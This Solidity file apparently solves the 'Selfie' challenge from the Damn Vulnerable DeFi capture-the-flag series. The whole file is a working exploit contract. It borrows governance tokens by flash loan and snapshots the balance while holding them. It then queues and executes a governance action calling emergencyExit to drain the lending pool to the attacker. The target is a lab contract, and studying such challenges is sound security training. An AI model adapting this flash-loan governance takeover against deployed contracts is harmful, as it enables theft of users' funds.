// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "hardhat/console.sol";

interface SelPool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns(bool);

    function emergencyExit(address receiver) external;
}

interface SelGov {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory);
}

interface IDamnValuableTokenSnapshot {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function snapshot() external returns (uint256);    
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external returns(uint256);
}


contract SelfieExploit {
    SelPool pool;
    SelGov gov;
    IDamnValuableTokenSnapshot token;
    uint256 actionId;

    constructor(address _target1, address _target2, address _target3) {
        pool = SelPool(_target1);
        gov = SelGov(_target2);
        token = IDamnValuableTokenSnapshot(_target3);
    }

    function exploit(uint256 amount) public {
        bytes memory data;
        data = abi.encodeWithSignature("emergencyExit(address)", address(tx.origin));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }
    
    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(
            token.balanceOf(address(this)) == 1500000 ether,
            "Didn't get loan."
        );
        IDamnValuableTokenSnapshot(_token).snapshot();
        token.approve(address(pool), type(uint).max);
        
        actionId = gov.queueAction(address(pool), 0, data);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function _run_actionid() public {
        gov.executeAction(actionId);
    }
}